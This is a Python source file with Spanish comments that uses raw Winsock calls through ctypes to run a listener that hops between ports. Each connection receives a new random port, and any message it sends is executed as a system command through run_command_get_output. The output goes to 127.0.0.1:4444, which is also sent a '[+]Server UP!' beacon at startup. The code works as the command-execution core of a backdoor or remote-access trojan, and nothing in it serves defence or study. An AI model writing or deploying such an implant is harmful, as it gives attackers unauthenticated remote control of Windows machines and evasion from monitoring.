import ctypes
import socket
from random import randint
from command_executor import *

messages = []


ws2_32 = ctypes.WinDLL("Ws2_32.dll")

# tipos según arquitectura
PTR_SZ = ctypes.sizeof(ctypes.c_void_p)
if PTR_SZ == 8:
    SOCK_T = ctypes.c_uint64   # SOCKET en Win64
else:
    SOCK_T = ctypes.c_uint32   # SOCKET en Win32

# FD_SET correcto según arquitectura
FD_SETSIZE = 64
class FD_SET(ctypes.Structure):
    _fields_ = [
        ("fd_count", ctypes.c_uint),
        ("fd_array", SOCK_T * FD_SETSIZE),
    ]

class TIMEVAL(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long), ("tv_usec", ctypes.c_long)]

def fdset_single(sock):
    fds = FD_SET()
    fds.fd_count = 1
    fds.fd_array[0] = sock
    return fds

# estructuras y constantes
AF_INET = 2
SOCK_STREAM = 1
IPPROTO_TCP = 6
INADDR_ANY = 0x00000000

class WSAData(ctypes.Structure):
    _fields_ = [
        ("wVersion", ctypes.c_ushort),
        ("wHighVersion", ctypes.c_ushort),
        ("szDescription", ctypes.c_char * 257),
        ("szSystemStatus", ctypes.c_char * 129),
        ("iMaxSockets", ctypes.c_ushort),
        ("iMaxUdpDg", ctypes.c_ushort),
        ("lpVendorInfo", ctypes.c_char_p),
    ]

class SOCKADDR_IN(ctypes.Structure):
    _fields_ = [
        ("sin_family", ctypes.c_ushort),
        ("sin_port", ctypes.c_ushort),
        ("sin_addr", ctypes.c_ulong),
        ("sin_zero", ctypes.c_ubyte * 8),
    ]

# Declarar firmas de funciones importantes
ws2_32.WSAStartup.argtypes = [ctypes.c_ushort, ctypes.POINTER(WSAData)]
ws2_32.WSAStartup.restype = ctypes.c_int

ws2_32.WSAGetLastError.argtypes = []
ws2_32.WSAGetLastError.restype = ctypes.c_int

ws2_32.socket.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int]
ws2_32.socket.restype = SOCK_T

ws2_32.bind.argtypes = [SOCK_T, ctypes.c_void_p, ctypes.c_int]
ws2_32.bind.restype = ctypes.c_int

ws2_32.listen.argtypes = [SOCK_T, ctypes.c_int]
ws2_32.listen.restype = ctypes.c_int

ws2_32.accept.argtypes = [SOCK_T, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int)]
ws2_32.accept.restype = SOCK_T

ws2_32.recv.argtypes = [SOCK_T, ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
ws2_32.recv.restype = ctypes.c_int

ws2_32.send.argtypes = [SOCK_T, ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
ws2_32.send.restype = ctypes.c_int

ws2_32.select.argtypes = [ctypes.c_int, ctypes.POINTER(FD_SET), ctypes.POINTER(FD_SET), ctypes.POINTER(FD_SET), ctypes.POINTER(TIMEVAL)]
ws2_32.select.restype = ctypes.c_int

ws2_32.closesocket.argtypes = [SOCK_T]
ws2_32.closesocket.restype = ctypes.c_int

# funciones utilitarias
def wsa_startup():
    wsa = WSAData()
    res = ws2_32.WSAStartup(0x0202, ctypes.byref(wsa))
    if res != 0:
        raise OSError("WSAStartup failed: %d" % res)

def wsa_last_error():
    return ws2_32.WSAGetLastError()

def create_server_socket(port):
    sock = ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    if sock == 0 or sock == -1:
        raise OSError("socket() failed, err=%d" % wsa_last_error())

    addr = SOCKADDR_IN()
    addr.sin_family = AF_INET
    addr.sin_port = socket.htons(port)
    addr.sin_addr = INADDR_ANY
    addr.sin_zero = (ctypes.c_ubyte * 8)(*([0]*8))

    res = ws2_32.bind(sock, ctypes.byref(addr), ctypes.sizeof(addr))
    if res != 0:
        raise OSError(f"bind() failed port {port}, err={wsa_last_error()}")

    res = ws2_32.listen(sock, 5)
    if res != 0:
        raise OSError(f"listen() failed, err={wsa_last_error()}")

    print(f"[+] Escuchando en puerto {port}")
    return sock

def accept_connection(server_socket):
    addr = SOCKADDR_IN()
    addrlen = ctypes.c_int(ctypes.sizeof(addr))
    client_sock = ws2_32.accept(server_socket, ctypes.byref(addr), ctypes.byref(addrlen))
    if client_sock == 0 or client_sock == -1:
        raise OSError("accept() failed err=%d" % wsa_last_error())
    print("[+] Conexión aceptada")

    # enviar nuevo puerto inmediatamente
    new_port = randint(10000, 65000)
    response = f"nuevo puerto: {new_port}\n"
    buf = ctypes.create_string_buffer(response.encode("utf-8"))
    sent = ws2_32.send(client_sock, ctypes.byref(buf), len(buf.raw.rstrip(b"\x00")), 0)
    if sent == -1:
        print("[!] send() failed err=", wsa_last_error())
    else:
        print(f"[<] Enviado al cliente: {response.strip()}")

    # intentar recibir (non-blocking via select con timeout corto)
    tv = TIMEVAL()
    tv.tv_sec = 0
    tv.tv_usec = 200_000  # 200 ms

    readfds = fdset_single(client_sock)
    ready = ws2_32.select(0, ctypes.byref(readfds), None, None, ctypes.byref(tv))
    if ready > 0:
        bufsize = 4096
        recv_buf = ctypes.create_string_buffer(bufsize)
        rlen = ws2_32.recv(client_sock, ctypes.byref(recv_buf), bufsize, 0)
        if rlen > 0:
            msg = recv_buf.raw[:rlen].decode("utf-8", errors="ignore").strip()
            messages.append(msg)
            print(f"[>] Mensaje recibido: {msg}")
            if msg:
                stdout= run_command_get_output(msg)
                send_message("127.0.0.1", 4444,stdout)
        elif rlen == 0:
            print("[~] Cliente cerró sin enviar datos.")
        else:
            print("[!] recv() error, err=", wsa_last_error())
    elif ready == 0:
        print("[~] No hay datos (timeout).")
    else:
        print("[!] select() error, WSAGetLastError() =", wsa_last_error())

    return client_sock, new_port
def send_message(ip: str, port: int, message: str):
    # Crear socket cliente
    sock = ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    if sock == 0 or sock == -1:
        raise OSError("socket() failed err=%d" % wsa_last_error())

    # Preparar sockaddr_in destino
    addr = SOCKADDR_IN()
    addr.sin_family = AF_INET
    addr.sin_port = socket.htons(port)
    addr.sin_zero = (ctypes.c_ubyte * 8)(*([0]*8))

    # convertir IP string -> int
    addr.sin_addr = socket.htonl(int.from_bytes(socket.inet_aton(ip), "big"))

    # Conectar
    res = ws2_32.connect(sock, ctypes.byref(addr), ctypes.sizeof(addr))
    if res != 0:
        err = wsa_last_error()
        ws2_32.closesocket(sock)
        raise OSError(f"connect() failed err={err}")

    # Preparar mensaje
    msg_bytes = message.encode("utf-8")
    buf = ctypes.create_string_buffer(msg_bytes)

    sent = ws2_32.send(sock, ctypes.byref(buf), len(msg_bytes), 0)
    if sent == -1:
        err = wsa_last_error()
        ws2_32.closesocket(sock)
        raise OSError(f"send() failed err={err}")

    print(f"[<] Enviado a {ip}:{port} → {message}")

    ws2_32.closesocket(sock)
def close_socket(sock):
    ws2_32.closesocket(sock)

# ---- ejemplo MAIN ----

def iniciar_listener():
    send_message("127.0.0.1", 4444, "[+]Server UP!")
    wsa_startup()
    current_port = randint(9000, 50000)

    while True:
        server = create_server_socket(current_port)
        client, nxt = accept_connection(server)
        close_socket(client)
        close_socket(server)
        current_port = nxt
